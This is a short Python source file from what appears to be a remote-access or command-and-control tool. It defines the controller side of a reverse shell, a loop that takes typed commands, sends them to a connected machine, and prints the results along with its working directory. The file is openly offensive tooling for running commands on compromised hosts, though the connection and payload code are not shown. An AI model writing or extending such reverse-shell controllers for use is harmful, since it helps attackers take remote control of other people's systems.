from core.utils import display_msg
class ReverseShell:

    def run_commands(self, server):
        run_shell = True
        pwd = server.receive_data()
        while run_shell:
            command = input(pwd+" >> ")
            server.send_data(command)
            if command == "exit" or command == "stop" or command == "quit" or command == "q":
                run_shell = False
                break        
            elif command.startswith("cd"):
                display_msg("changing path")
            elif command == "":
                display_msg("No command entered", "r")
            else:
                cmd_result = server.receive_data()
                print(cmd_result)
            pwd = server.receive_data()



def run_reverse_shell(server):
    rs = ReverseShell()
    rs.run_commands(server)


